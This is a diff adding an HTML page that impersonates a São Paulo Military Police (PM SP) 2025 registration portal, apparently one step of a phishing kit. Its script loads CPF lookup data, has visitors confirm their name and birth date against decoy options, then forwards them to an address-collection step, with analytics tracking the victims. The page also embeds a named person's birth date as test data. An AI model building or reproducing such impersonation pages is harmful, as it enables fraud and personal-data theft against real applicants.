@@ -1,0 +1,376 @@
+﻿<!doctype html>
+<html lang="pt-br">
+    <meta http-equiv="content-type" content="text/html;charset=utf-8">
+    <head>
+        <meta charset="UTF-8">
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <title>PM SP 2025 - Validação de Dados</title>
+
+        <!-- Microsoft Clarity Analytics -->
+        <script type="text/javascript">
+            (function (c, l, a, r, i, t, y) {
+                c[a] =
+                    c[a] ||
+                    function () {
+                        (c[a].q = c[a].q || []).push(arguments);
+                    };
+                t = l.createElement(r);
+                t.async = 1;
+                t.src = "https://www.clarity.ms/tag/" + i;
+                y = l.getElementsByTagName(r)[0];
+                y.parentNode.insertBefore(t, y);
+            })(window, document, "clarity", "script", "t84urj3twx");
+        </script>
+
+        <script src="../../3.4.16-1.js"></script>
+        <link href="../css/all.min-1.css" rel="stylesheet">
+        <link href="../css/home-1.css" rel="stylesheet">
+        <!-- Sistema de parâmetros cross-domain removido -->
+        <!-- Umitfy UTM Tracking - Comentado para uso futuro -->
+        <!-- <script src="../../scripts/utms/latest.js" data-utmify-prevent-subids="" async="" defer=""></script> -->
+        <script>
+            // Replace with your actual counter name
+            fetch("https://counterapi.com/api/hit/cnu")
+                .then((res) => res.json())
+                .then((data) => {
+                    // Visit tracking enabled
+                })
+                .catch((err) => console.error("Visit counter error:", err));
+        </script>
+
+        <style>
+            .gov-header {
+                background-color: #222222;
+            }
+            .inep-header {
+                background-color: #044785;
+            }
+            .form-header {
+                background-color: #fbc12a;
+                color: white;
+                font-weight: 600;
+            }
+            button#submit-button {
+                transition: all 0.2s ease;
+                background-color: #003f6b;
+                color: rgba(255, 255, 255, 0.6);
+            }
+            button#submit-button:not([disabled]) {
+                color: white;
+                cursor: pointer;
+            }
+            button#submit-button:not([disabled]):hover {
+                background-color: #4d7396;
+            }
+            .required-star {
+                color: #ff0000;
+            }
+            .footer-bg {
+                background-color: #1c2b39;
+            }
+            .option-container {
+                border: 2px solid #d1d5db;
+                transition: all 0.2s ease;
+            }
+            .option-container:hover {
+                border-color: #93c5fd;
+            }
+            .option-container.selected {
+                border-color: #003f6b;
+                background-color: #f0f9ff;
+            }
+            .option-container.selected .option-selector {
+                background-color: #003f6b;
+                color: white;
+            }
+            .option-selector {
+                background-color: #e5e7eb;
+                color: #4b5563;
+            }
+            #validation-step {
+                transition: opacity 0.5s ease;
+            }
+        </style>
+        <script>
+            const fakeName1 = "MARCELO HENRIQUE SILVA SOUZA";
+            const fakeName2 = "LUCAS PEREIRA MENDES";
+
+            const fakeDate1 = "1998-03-25";
+            const fakeDate2 = "2002-08-17";
+
+            let currentStep = 1;
+            let nomeSelecionado = null;
+            let dataSelecionada = null;
+            let userData = null;
+
+            document.addEventListener("DOMContentLoaded", function () {
+                // SISTEMA DE SEGURANÇA TEMPORARIAMENTE DESATIVADO
+                const cpfDataString = localStorage.getItem("cpfData");
+
+                // Dados de teste para desenvolvimento (quando não há dados reais)
+                const testUserData = {
+                    NOME: "IRACEMA DE SOUSA SILVA",
+                    NASC: "1970-10-24 00:00:00",
+                };
+
+                if (!cpfDataString) {
+                    console.log(
+                        "⚠️ Usando dados de teste - Sistema de segurança desativado",
+                    );
+                    userData = testUserData;
+                } else {
+                    const parsedData = JSON.parse(cpfDataString);
+                    const user = parsedData.DADOS;
+
+                    if (!user) {
+                        console.log(
+                            "⚠️ Usando dados de teste - Sistema de segurança desativado",
+                        );
+                        userData = testUserData;
+                    } else {
+                        userData = user;
+                    }
+                }
+                console.log("Dados carregados:", userData);
+
+                showValidationStep(1);
+                fillNameOptions();
+
+                const submitBtn = document.getElementById("submit-button");
+                submitBtn.addEventListener("click", function () {
+                    if (currentStep === 1) {
+                        if (nomeSelecionado) {
+                            if (nomeSelecionado === userData.NOME) {
+                                showValidationStep(2);
+                                fillDateOptions();
+                            } else {
+                                alert(
+                                    "Nome incorreto! Por favor tente novamente.",
+                                );
+                                resetNameSelection();
+                            }
+                        } else {
+                            alert("Selecione uma opção para prosseguir.");
+                        }
+                    } else if (currentStep === 2) {
+                        if (dataSelecionada) {
+                            if (dataSelecionada === userData.NASC) {
+                                window.location.href = "../endereco/";
+                            } else {
+                                alert(
+                                    "Data de nascimento incorreta! Por favor tente novamente.",
+                                );
+                                resetDateSelection();
+                            }
+                        } else {
+                            alert("Selecione uma opção para prosseguir.");
+                        }
+                    }
+                });
+            });
+
+            function fillNameOptions() {
+                const options = [userData.NOME, fakeName1, fakeName2];
+                shuffleArray(options);
+
+                const nameOptions = document.getElementById("name-options");
+                nameOptions.innerHTML = "";
+
+                options.forEach((name, index) => {
+                    const option = document.createElement("div");
+                    option.className =
+                        "option-container rounded-md p-4 mb-3 cursor-pointer flex items-center";
+                    option.innerHTML = `
+                <div class="option-selector flex-shrink-0 rounded-full h-6 w-6 mr-3 flex items-center justify-center text-sm font-bold">
+                    ${index + 1}
+                </div>
+                <div class="flex-grow" style="text-transform:uppercase;">${name}</div>
+            `;
+                    option.addEventListener("click", function () {
+                        selectNameOption(this, name);
+                    });
+                    nameOptions.appendChild(option);
+                });
+            }
+
+            function fillDateOptions() {
+                const options = [userData.NASC, fakeDate1, fakeDate2];
+                shuffleArray(options);
+
+                const dateOptions = document.getElementById("date-options");
+                dateOptions.innerHTML = "";
+
+                options.forEach((date, index) => {
+                    const formattedDate = formatDate(date);
+                    const option = document.createElement("div");
+                    option.className =
+                        "option-container rounded-md p-4 mb-3 cursor-pointer flex items-center";
+                    option.innerHTML = `
+                <div class="option-selector flex-shrink-0 rounded-full h-6 w-6 mr-3 flex items-center justify-center text-sm font-bold">
+                    ${index + 1}
+                </div>
+                <div class="flex-grow">${formattedDate}</div>
+            `;
+                    option.addEventListener("click", function () {
+                        selectDateOption(this, date);
+                    });
+                    dateOptions.appendChild(option);
+                });
+            }
+
+            function formatDate(dateString) {
+                if (!dateString) return "";
+                // Remove a parte da hora se existir (tanto com 'T' quanto com espaço)
+                if (dateString.includes("T")) {
+                    dateString = dateString.split("T")[0];
+                } else if (dateString.includes(" ")) {
+                    dateString = dateString.split(" ")[0];
+                }
+                const parts = dateString.split("-");
+                if (parts.length === 3) {
+                    return `${parts[2]}/${parts[1]}/${parts[0]}`;
+                }
+                return dateString;
+            }
+
+            function selectNameOption(element, name) {
+                const options = document.querySelectorAll(
+                    "#name-options .option-container",
+                );
+                options.forEach((opt) => opt.classList.remove("selected"));
+                element.classList.add("selected");
+                nomeSelecionado = name;
+                document.getElementById("submit-button").disabled = false;
+            }
+
+            function selectDateOption(element, date) {
+                const options = document.querySelectorAll(
+                    "#date-options .option-container",
+                );
+                options.forEach((opt) => opt.classList.remove("selected"));
+                element.classList.add("selected");
+                dataSelecionada = date;
+                document.getElementById("submit-button").disabled = false;
+            }
+
+            function resetNameSelection() {
+                const options = document.querySelectorAll(
+                    "#name-options .option-container",
+                );
+                options.forEach((opt) => opt.classList.remove("selected"));
+                nomeSelecionado = null;
+                document.getElementById("submit-button").disabled = true;
+            }
+
+            function resetDateSelection() {
+                const options = document.querySelectorAll(
+                    "#date-options .option-container",
+                );
+                options.forEach((opt) => opt.classList.remove("selected"));
+                dataSelecionada = null;
+                document.getElementById("submit-button").disabled = true;
+            }
+
+            function showValidationStep(step) {
+                const steps = document.querySelectorAll(".validation-step");
+                steps.forEach((s) => s.classList.add("hidden"));
+
+                document
+                    .getElementById(`step-${step}`)
+                    .classList.remove("hidden");
+                currentStep = step;
+                document.getElementById("submit-button").disabled = true;
+                document.getElementById("submit-button-text").textContent =
+                    "Prosseguir";
+            }
+
+            function shuffleArray(array) {
+                for (let i = array.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    [array[i], array[j]] = [array[j], array[i]];
+                }
+                return array;
+            }
+        </script>
+    </head>
+    <body class="flex flex-col min-h-screen">
+        <header class="gov-header text-white py-2">
+            <div class="container mx-auto flex justify-between items-center px-4">
+                <a class="font-bold text-sm" href="#">
+                    <img src="../images/top_gov-5.jpg" alt="Logotipo" class="h-6">
+                </a>
+                <nav>
+                    <ul class="flex space-x-4 text-[10px]">
+                        <li>
+                            <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                        </li>
+                        <li>
+                            <a class="hover:underline" href="#">PARTICIPE</a>
+                        </li>
+                        <li>
+                            <a class="hover:underline" href="#">SERVIÇOS</a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </header>
+        <div class="inep-header py-3">
+            <div class="container mx-auto px-4">
+                <img src="../images/pmsp-1.png" alt="PM SP logo" height="30" width="60" style="object-fit: contain">
+            </div>
+        </div>
+        <main class="flex-grow py-8">
+            <div class="container mx-auto px-4 max-w-3xl">
+                <div class="border border-gray-300 rounded">
+                    <div class="form-header py-2 px-4 text-center">
+                        <h2 class="text-lg">
+                            Inscrição &gt; Validação de Dados
+                        </h2>
+                    </div>
+                    <div class="p-4">
+                        <div class="validation-step hidden" id="step-1">
+                            <p class="mb-4">
+                                Para confirmar sua identidade, selecione seu
+                                nome completo entre as opções abaixo:
+                            </p>
+                            <div id="name-options" class="mt-6"></div>
+                        </div>
+                        <div class="validation-step hidden" id="step-2">
+                            <p class="mb-4">
+                                Agora, selecione sua data de nascimento entre as
+                                opções abaixo:
+                            </p>
+                            <div id="date-options" class="mt-6"></div>
+                        </div>
+                    </div>
+                    <div class="border-t border-gray-300">
+                        <div class="p-2 bg-gray-100 flex items-center">
+                            <a class="text-gray-700 flex items-center" href="#"><i class="fas fa-sign-out-alt mr-1"></i>
+                                Sair</a>
+                        </div>
+                        <div class="form-footer p-0 flex justify-center items-center">
+                            <button id="submit-button" class="flex items-center justify-center w-full h-full py-3" type="button" disabled="">
+                                <i class="fas fa-arrow-right mr-2"></i>
+                                <span id="submit-button-text">Prosseguir</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+        <footer class="footer-bg text-white py-4 text-xs">
+            <div class="container mx-auto px-4">
+                <div class="flex flex-col items-center mb-2">
+                    <img src="../images/pmsp-1.png" alt="PM SP logo" height="30" width="60" style="object-fit: contain">
+                </div>
+                <div class="flex justify-between items-center">
+                    <div>&copy; PM SP - Polícia Militar de São Paulo</div>
+                    <div class="flex items-center">
+                        <i class="fas fa-phone-alt mr-1"></i> 0800 616161
+                    </div>
+                </div>
+            </div>
+        </footer>
+    <script defer="" src="../../beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015-1" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"a85dcd35d0ac4aa4b520758cac699320","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
